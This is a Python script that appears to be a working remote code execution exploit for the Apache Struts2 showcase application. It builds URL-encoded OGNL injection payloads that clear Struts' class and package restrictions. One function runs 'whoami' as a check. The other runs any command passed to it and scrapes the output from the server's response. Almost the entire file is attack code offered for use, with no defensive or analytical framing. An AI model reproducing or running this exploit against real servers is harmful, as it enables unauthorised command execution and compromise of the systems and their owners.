# -*- coding: utf-8 -*-


import requests
import sys
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def exp_check(url):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
               'Referer': 'http://96.63.216.104:8080/actionchaining/register2.action', 'Connection': 'close',
               'Cookie': 'JSESSIONID=E25862AE388D006049EA9D3CEF12F246', 'Upgrade-Insecure-Requests': '1',
               'Cache-Control': 'max-age=0'}
    tturl = url + "/struts2-showcase/" + "%24%7B%0A(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('whoami')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D" + "/actionChain1.action"
    try:
        r = requests.get(tturl, headers=headers)
        if r.status_code == 200:
            return 1
        return 2
    except:
        return 3

def exp_cmd(url, cmd):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
               'Referer': 'http://96.63.216.104:8080/actionchaining/register2.action', 'Connection': 'close',
               'Cookie': 'JSESSIONID=E25862AE388D006049EA9D3CEF12F246', 'Upgrade-Insecure-Requests': '1',
               'Cache-Control': 'max-age=0'}
    tturl = url + "/struts2-showcase/" + "%24%7B%0A(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('" + cmd + "')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D" + "/actionChain1.action"
    try:
        r = requests.get(tturl, headers=headers)
        # page = r.text
        string = r.text
        # print(string)
        pattern = r"/struts2-showcase/(.*?) //WEB-INF"
        # pattern = r"<a id=\"(.*?)\n"
        match = re.search(pattern, string)
        # print(match)
        matched_string = match.group(1)
        # print(matched_string)
        print(matched_string)
        return matched_string
    except:
        return 3

if __name__ == '__main__':
    pass
    # url = 'http://192.168.67.134:8080'
    # cmd='whoami'
    #
    # print(exp_check(url))
    # exp_cmd(url,cmd)
